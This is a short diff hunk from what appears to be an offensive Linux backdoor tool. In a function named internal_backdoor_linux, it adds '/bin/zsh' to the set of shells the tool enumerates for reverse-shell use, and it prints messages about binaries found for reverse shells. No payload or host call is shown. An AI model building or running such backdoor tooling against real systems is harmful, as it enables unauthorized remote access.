@@ -48,7 +48,7 @@ def internal_backdoor_linux():
         if binary_exist:
             print(f"[#] FOUND BINARY TO REVERSE SHELL: {reverse}")
     print("------------------------------------------------")
-    shell = {'/bin/bash','/bin/sh'}
+    shell = {'/bin/bash','/bin/sh','/bin/zsh'}
     print("------------------------------------------------")
 
     for shell_1337 in shell:
